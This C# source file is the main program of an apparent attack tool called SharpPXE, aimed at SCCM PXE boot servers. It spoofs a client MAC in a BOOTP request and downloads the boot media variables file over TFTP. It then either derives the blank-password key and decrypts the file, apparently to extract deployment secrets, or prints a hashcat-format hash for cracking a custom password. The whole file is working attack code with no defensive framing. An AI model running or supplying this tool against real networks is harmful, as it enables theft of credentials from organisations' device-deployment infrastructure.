using System;
using System.Text;
using System.Linq;


namespace SharpPXE
{

    class Program
    {
        static void Main(string[] args)
        {
            string target = args[0];
            int port = 4011;
            
            using (SCCM sccm = new SCCM(target, port))
            {
                string clientIp = "0.0.0.0";
                byte[] clientMac = new byte[] { 0xFE, 0xED, 0xDE, 0xAD, 0xBE, 0xEF }; 
                byte[] decryptionKey = null;

                var (variablesFile, bcdFile, encryptedKey) = sccm.SendBootpRequest(clientIp, clientMac);

            if (variablesFile != null)
            {
                Console.WriteLine($"[*] Variables File: {variablesFile}");
                Console.WriteLine($"[*] BCD File: {bcdFile}");
                if (encryptedKey != null)
                {
                    decryptionKey = sccm.DeriveBlankDecryptionKey(encryptedKey);
                    Console.WriteLine($"[*] Decryption Key: {BitConverter.ToString(decryptionKey)}");
                    byte[] keyForDecryption = sccm.AesDesKeyDerivation(decryptionKey);

                    Console.WriteLine("[*] Downloading variables file via TFTP...");

                    TftpClient tftpClient = new TftpClient(target);
                    byte[] fileData = tftpClient.GetFile(variablesFile);
                    if (fileData != null)
                    {
                        Console.WriteLine($"[*] File '{variablesFile}' downloaded successfully. Size: {fileData.Length} bytes");

                        // Remove header and footer
                        int start = 24;
                        int end = fileData.Length - 8;
                        int length = end - start;

                        if (length <= 0)
                        {
                            Console.WriteLine("[!] Data length is not enough!.");
                            return;
                        }

                        byte[] dataToDecrypt = sccm.ReadMediaVariableFile(fileData);

                        if (dataToDecrypt.Length == 0)
                        {
                            Console.WriteLine("[!] Data length is not enough!.");
                            return;
                        }

                        int remainder = dataToDecrypt.Length % 16;
                        if (remainder != 0)
                        {
                            int adjustedLength = dataToDecrypt.Length - remainder;
                            byte[] adjustedData = new byte[adjustedLength];
                            Array.Copy(dataToDecrypt, adjustedData, adjustedLength);
                            dataToDecrypt = adjustedData;
                        }

                        string encryptionMode = sccm.GetEncryptionModeFromHeader(fileData);
                        Console.WriteLine($"[*] Encryption Mode: {encryptionMode ?? "unknown (defaulting to aes128)"}");

                        byte[] decryptedVariablesFileData;

                        try
                        {
                            if (encryptionMode == "aes256")
                            {
                                byte[] aesKey = keyForDecryption.Take(32).ToArray();
                                decryptedVariablesFileData = sccm.Aes256DecryptRaw(dataToDecrypt, aesKey);
                            }
                            else
                            {
                                byte[] aesKey = keyForDecryption.Take(16).ToArray();
                                decryptedVariablesFileData = sccm.Aes128DecryptRaw(dataToDecrypt, aesKey);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Decryption failed: " + ex.Message);
                            return;
                        }

                       // Console.WriteLine($"Original File Data Length: {fileData.Length} bytes");
                        //Console.WriteLine($"Data to Decrypt Length (after trimming): {dataToDecrypt.Length} bytes");
                        //Console.WriteLine($"Data Length Modulo 16: {dataToDecrypt.Length % 16}");
                        string decryptedString = Encoding.Unicode.GetString(decryptedVariablesFileData);
                        Console.WriteLine($"Decrypted (Unicode): {decryptedString}");

                        decryptedString = decryptedString.Replace("\0", "");
                        decryptedString = new string(decryptedString.Where(c => !char.IsControl(c) || c == '\n' || c == '\r' || c == '\t').ToArray());

                        sccm.ProcessPxeMediaXml(decryptedString);
                        // File.WriteAllBytes("media_variables.dat", decryptedVariablesFileData);
                        // Console.WriteLine("Media variable file decrypted and saved.");
                    }
                    else
                    {
                        Console.WriteLine("Failed to retrieve variables file or encrypted key.");
                    }
                }
                else
                {
                    Console.WriteLine("PXE boot media is encrypted with custom password");

                    Console.WriteLine("Downloading variables file via TFTP...");
                    // Download the variables file via TFTP
                    TftpClient tftpClient = new TftpClient(target);
                    byte[] fileData = tftpClient.GetFile(variablesFile);
                    if (fileData != null)
                    {
                        Console.WriteLine($"File '{variablesFile}' downloaded successfully. Size: {fileData.Length} bytes");

                        byte[] header = sccm.ReadMediaVariableFileHeader(fileData);
                        string mediaFileHash = BitConverter.ToString(header).Replace("-", "").ToLower();
                        string detectedMode = sccm.GetEncryptionModeFromHeader(fileData) ?? "aes128";
                        string hashcatHash = $"$sccm${detectedMode}${mediaFileHash}";
                        Console.WriteLine($"Got the hash: {hashcatHash}");
                    }
                    else
                    {
                        Console.WriteLine("Failed to retrieve variables file.");
                    }
                }
            }
            else
            {
                Console.WriteLine("No variables file received.");
            }
            }
        }
    }
}
